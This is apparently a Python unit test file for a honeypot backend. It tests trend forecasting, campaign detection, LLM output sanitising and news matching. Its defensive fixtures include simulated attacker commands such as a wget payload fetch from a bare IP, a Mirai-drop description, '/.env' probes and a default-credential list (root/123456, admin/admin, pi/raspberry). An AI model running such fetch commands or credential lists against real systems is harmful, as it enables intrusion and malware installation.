"""Unit-Tests für Trends, Kampagnen, LLM-Ausgabefilter und Insights (python3 -m unittest -v im Verzeichnis backend/)."""
import json
import unittest
from unittest import mock

import campaigns
import insights
import llm
import news
import sessions
import trends
from store import Store

NOW = 1_800_000_000 + 1800  # mitten in einer Stunde
HOUR = 3600


def login(ip, user, pw, ts):
    return {"ts": ts, "ip": ip, "type": "SSH-Probe", "sev": "high", "detail": f"Login attempt as “{user}” · password “{pw}”"}


def command(ip, cmd, ts):
    return {"ts": ts, "ip": ip, "type": "SSH-Probe", "sev": "crit", "detail": f"Command “{cmd}”"}


class TrendTests(unittest.TestCase):
    def test_flat_history_gives_flat_forecast(self):
        cur = NOW // HOUR
        counts = {h: 100 for h in range(cur - 7 * 24, cur)}
        t = trends.compute(counts, NOW)
        self.assertEqual(t["level"], 1.0)
        self.assertEqual(t["deviation"], 0)
        self.assertEqual(t["next24"], 2400)
        self.assertEqual(len(t["forecast"]), 24)
        self.assertEqual(t["anomalies"], [])

    def test_spike_is_anomaly_and_raises_level(self):
        cur = NOW // HOUR
        counts = {h: 100 + (h % 3) for h in range(cur - 7 * 24, cur)}
        counts[cur - 2] = 900
        t = trends.compute(counts, NOW)
        self.assertEqual([a["t"] for a in t["anomalies"]], [(cur - 2) * HOUR])
        self.assertGreater(t["level"], 1.0)
        # Niveau klingt ab: die erste Prognosestunde liegt über der letzten
        self.assertGreater(t["forecast"][0]["exp"], t["forecast"][-1]["exp"])

    def test_empty_history(self):
        t = trends.compute({}, NOW)
        self.assertEqual((t["level"], t["deviation"], t["next24"]), (1.0, None, 0))

    def test_hourly_counts_from_store(self):
        store = Store(":memory:")
        store.add_events([command("1.2.3.4", "id", NOW - 10), command("1.2.3.4", "id", NOW - HOUR - 10)])
        self.assertEqual(sorted(trends.hourly_counts(store, NOW).values()), [1, 1])


class CampaignTests(unittest.TestCase):
    def setUp(self):
        self.store = Store(":memory:")

    def test_same_command_sequence_from_three_ips(self):
        evs = []
        for i, ip in enumerate(("1.1.1.1", "2.2.2.2", "3.3.3.3")):
            evs += [command(ip, "uname -a", NOW - 100 + i), command(ip, "uname -a", NOW - 90 + i),
                    command(ip, "wget http://9.8.7.6/x", NOW - 80 + i)]
        evs.append(command("4.4.4.4", "uname -a", NOW - 50))  # andere Folge
        self.store.add_events(evs)
        found = campaigns.detect(self.store, NOW)
        self.assertEqual(len(found), 1)
        c = found[0]
        self.assertEqual((c["kind"], c["ips"], c["events"]), ("commands", 3, 9))
        self.assertEqual(c["sample"], ["uname -a", "wget http://9.8.7.x/x"])  # Folge zusammengefasst, IP gekürzt
        self.assertEqual(c["drill"], {"kind": "command", "value": "uname -a"})

    def test_credential_list_and_stable_key(self):
        creds = [("root", "123456"), ("admin", "admin"), ("pi", "raspberry")]
        self.store.add_events([login(ip, u, p, NOW - 60) for ip in ("5.5.5.1", "5.5.5.2", "5.5.5.3") for u, p in creds])
        first = campaigns.detect(self.store, NOW)
        self.assertEqual([c["kind"] for c in first], ["creds"])
        self.assertEqual(first[0]["drill"]["kind"], "password")
        self.assertEqual(campaigns.detect(self.store, NOW + 600)[0]["key"], first[0]["key"])

    def test_random_session_tokens_are_normalized(self):
        self.store.add_events([command(ip, f"echo check_{h * 32}_done", NOW - 100) for ip, h in
                               (("5.5.5.1", "a"), ("5.5.5.2", "b"), ("5.5.5.3", "c"))])
        c = campaigns.detect(self.store, NOW)[0]
        self.assertEqual((c["ips"], c["sample"]), (3, ["echo check_‹hex›_done"]))
        self.assertEqual(c["drill"], {"kind": "command_like", "value": "echo check\\_%\\_done"})
        self.assertEqual(self.store.events_where(c["drill"]["kind"], c["drill"]["value"], 0)[0], 3)

    def test_too_few_creds_or_ips_is_no_campaign(self):
        self.store.add_events([login(ip, "root", "x", NOW - 60) for ip in ("6.6.6.1", "6.6.6.2", "6.6.6.3")])
        self.store.add_events([command(ip, "ls", NOW - 60) for ip in ("7.7.7.1", "7.7.7.2")])
        self.assertEqual(campaigns.detect(self.store, NOW), [])

    def test_asn_wave(self):
        self.store.save_geo([("8.8.8.%d" % i, 0, 0, "US", "USA", "", "Bad ISP", "AS666", NOW) for i in range(5)])
        self.store.add_events([command("8.8.8.%d" % (i % 5), "x%d" % i, NOW - 60 - i) for i in range(150)])
        waves = [c for c in campaigns.detect(self.store, NOW) if c["kind"] == "wave"]
        self.assertEqual(waves[0]["drill"], {"kind": "asn", "value": "AS666"})


class CleanTests(unittest.TestCase):
    def test_removes_links_markdown_and_ips(self):
        out = llm.clean("**Alert** from 10.20.30.40: visit https://evil.example/x or evil.ru now\x07")
        self.assertNotIn("http", out)
        self.assertNotIn("evil.ru", out)
        self.assertNotIn("*", out)
        self.assertIn("10.20.30.x", out)
        self.assertNotIn("\x07", out)

    def test_length_cut_at_sentence(self):
        self.assertEqual(llm.clean("One. Two. " + "x" * 50, limit=12), "One. Two.")


class InsightsTests(unittest.TestCase):
    def setUp(self):
        self.store = Store(":memory:")
        self.store.add_events([command(ip, "uname -a", NOW - 100) for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3")])
        patcher = mock.patch("news.fetch")  # kein Netz in Tests
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_without_llm(self):
        insights.run_once(self.store, None, NOW)
        with mock.patch("time.time", return_value=NOW):
            p = insights.payload(self.store, False)
        self.assertEqual(len(p["campaigns"]), 1)
        self.assertIsNone(p["campaigns"][0]["label"])
        self.assertIsNone(p["report"])
        self.assertIn("forecast", p["trend"])

    def test_with_llm_names_once_and_reports(self):
        answers = [("Activity was **normal**. See https://x.com", "m"),
                   (json.dumps({"name": "Uname Recon", "summary": "Bots fingerprint hosts.", "intent": "recon"}), "m"),
                   (json.dumps({"summary": "Fingerprints the OS.", "intent": "recon", "risk": "low"}), "m")]
        with mock.patch("llm.ask", side_effect=answers) as ask:
            insights.run_once(self.store, {"ssh": "x"}, NOW)
            insights.run_once(self.store, {"ssh": "x"}, NOW + 900)  # alles erledigt, Bericht noch frisch: kein Aufruf
        self.assertEqual(ask.call_count, 3)
        self.assertEqual(sessions.for_ip(self.store, "1.1.1.1")["analysis"]["intent"], "recon")
        with mock.patch("time.time", return_value=NOW):
            p = insights.payload(self.store, True)
        self.assertEqual(p["campaigns"][0]["label"]["name"], "Uname Recon")
        self.assertEqual(p["report"]["text"], "Activity was normal. See [link removed]")

    def test_busy_skips_llm(self):
        with mock.patch("llm.ask", side_effect=llm.Busy()):
            insights.run_once(self.store, {"ssh": "x"}, NOW)
        self.assertIsNone(insights.payload(self.store, True)["report"])

    def test_bad_name_json_is_ignored(self):
        self.assertIsNone(insights.parse_name("not json"))
        self.assertEqual(insights.parse_name('{"name": "X", "intent": "evil"}')["intent"], "other")


class SessionTests(unittest.TestCase):
    def setUp(self):
        self.store = Store(":memory:")

    def test_junk_ignored_and_repeats_collapsed(self):
        self.store.add_events([command("9.9.9.9", c, NOW - 100 + i) for i, c in enumerate(
            ["?", "\ufffd\ufffd", "uname -a", "id", "uname -a", "id"])])
        self.assertEqual(campaigns.command_prints(self.store, 0)["9.9.9.9"], ("uname -a", "id"))
        s = sessions.for_ip(self.store, "9.9.9.9")
        self.assertEqual((s["commands"], s["analysis"]), (["uname -a", "id"], None))
        self.assertIsNone(sessions.for_ip(self.store, "1.1.1.1"))

    def test_parse_validates(self):
        intents = insights.INTENTS
        self.assertIsNone(sessions.parse("[]", intents))
        a = sessions.parse('{"summary": "Drops **mirai** from http://1.2.3.4/x", "intent": "x", "risk": "extreme"}', intents)
        self.assertEqual((a["intent"], a["risk"]), ("other", None))
        self.assertNotIn("http", a["summary"])


RSS = b"""<?xml version="1.0"?><rss version="2.0"><channel>
<item><title>Hackers exploit OpenSSH flaw</title><link>https://www.bleepingcomputer.com/a</link><pubDate>Mon, 09 Nov 2026 10:00:00 GMT</pubDate></item>
<item><title>Ransomware hits university database</title><link>https://www.bleepingcomputer.com/b</link><pubDate>Mon, 09 Nov 2026 10:00:00 GMT</pubDate></item>
<item><title>Phishing via evil link</title><link>https://evil.example/c</link><pubDate>Mon, 09 Nov 2026 10:00:00 GMT</pubDate></item>
</channel></rss>"""


class NewsTests(unittest.TestCase):
    def test_rss_safe_and_match(self):
        now = news._ts("Tue, 10 Nov 2026 10:00:00 GMT")
        items = news._safe(news.parse_rss(RSS), "bleepingcomputer.com")
        self.assertEqual(len(items), 2)  # fremde Domain verworfen
        result = news.match({"BleepingComputer": items}, {"ssh": (100, 5), "mysql-ransom": (50, 3)}, now)
        self.assertEqual([r["topic"] for r in result], ["ssh"])  # allgemeine Ransomware ist keine DB-Erpressung

    def test_mastodon_masks_ips_and_links_locally(self):
        data = json.dumps([{"id": "1", "created_at": "2026-11-09T10:00:00Z", "account": {"acct": "a@infosec.exchange"},
                            "content": "<p>Scanner 5.6.7.8 hunting .env</p>"}]).encode()
        items = news._safe(news.parse_mastodon(data), "mastodon.social")
        self.assertEqual(items[0]["title"], "Scanner 5.6.7.x hunting .env")
        self.assertTrue(items[0]["url"].startswith("https://mastodon.social/@a@infosec.exchange/1"))

    def test_evidence_threshold(self):
        store = Store(":memory:")
        store.add_events([{"ts": NOW - 60, "ip": "1.1.1.%d" % i, "type": "Web-Probe", "detail": "GET /.env → 404"}
                          for i in range(news.MIN_EVENTS)])
        self.assertEqual(news.evidence(store, NOW), {"secrets": (news.MIN_EVENTS, news.MIN_EVENTS)})


if __name__ == "__main__":
    unittest.main()
